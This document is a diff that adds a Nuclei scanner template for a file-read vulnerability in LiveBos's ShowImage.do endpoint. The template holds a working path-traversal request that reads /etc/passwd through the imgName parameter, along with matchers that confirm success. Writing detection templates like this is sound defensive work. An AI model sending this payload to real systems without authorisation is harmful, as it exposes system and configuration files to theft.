@@ -1,0 +1,27 @@
+id: livebos-showimage-file-read
+
+info:
+  name: LiveBos ShowImage.do File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    LiveBos ShowImage.do endpoint has a file inclusion vulnerability in the `imgName` parameter that allows attackers to read critical system files such as database configuration files.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Template
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:"
+        part: body
